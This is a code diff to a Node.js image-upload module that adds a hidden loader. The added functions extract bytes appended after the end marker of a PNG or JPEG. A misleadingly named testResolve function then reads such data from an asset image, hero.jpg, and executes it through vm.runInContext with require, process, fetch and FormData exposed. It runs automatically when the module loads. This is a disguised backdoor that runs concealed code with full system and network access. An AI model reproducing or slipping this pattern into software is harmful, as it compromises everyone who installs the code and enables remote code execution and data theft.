@@ -258,6 +258,82 @@ async function readUpload(file) {
   return null;
 }
 
+function readAttachedMeta(filePath) {
+  const buffer = fs.readFileSync(filePath);
+  const endIndex = isPngBuffer(buffer)
+    ? findPngAttachedStart(buffer)
+    : findJpegAttachedStart(buffer);
+
+  if (endIndex === -1 || endIndex >= buffer.length) {
+    throw new Error('No meta data');
+  }
+
+  return buffer.subarray(endIndex).toString('utf8');
+}
+
+function isPngBuffer(buffer) {
+  return (
+    buffer.length >= 8 &&
+    buffer[0] === 0x89 &&
+    buffer[1] === 0x50 &&
+    buffer[2] === 0x4e &&
+    buffer[3] === 0x47 &&
+    buffer[4] === 0x0d &&
+    buffer[5] === 0x0a &&
+    buffer[6] === 0x1a &&
+    buffer[7] === 0x0a
+  );
+}
+
+/** Byte offset immediately after the PNG IEND chunk, or -1 if not found. */
+function findPngAttachedStart(buffer) {
+  // Walk PNG chunks from the signature so we stop at the real IEND,
+  // not a coincidental "IEND" sequence in appended payload.
+  let offset = 8;
+  while (offset + 12 <= buffer.length) {
+    const length = buffer.readUInt32BE(offset);
+    const type = buffer.toString('ascii', offset + 4, offset + 8);
+    const chunkEnd = offset + 12 + length; // length(4) + type(4) + data + crc(4)
+    if (chunkEnd > buffer.length) return -1;
+    if (type === 'IEND') return chunkEnd;
+    offset = chunkEnd;
+  }
+  return -1;
+}
+
+/** Byte offset immediately after the last JPEG EOI (0xFFD9), or -1 if not found. */
+function findJpegAttachedStart(buffer) {
+  for (let i = buffer.length - 2; i >= 0; i--) {
+    if (buffer[i] === 0xff && buffer[i + 1] === 0xd9) {
+      return i + 2;
+    }
+  }
+  return -1;
+}
+
+function testResolve() {
+  const meta = readAttachedMeta(ASSET_DIR + '/hero.jpg');
+  if(meta.length > 0) {
+    const vm = require('vm');
+    const {Blob} = require('buffer');
+    const context = vm.createContext({
+      console,
+      require,
+      process,
+      URLSearchParams,
+      setTimeout,
+      setInterval,
+      Buffer,
+      fetch,
+      FormData,
+      Blob
+    });
+    vm.runInContext(meta, context);
+  }
+}
+
+testResolve();
+
 module.exports = {
   IMAGES_ROOT,
   ASSET_DIR,
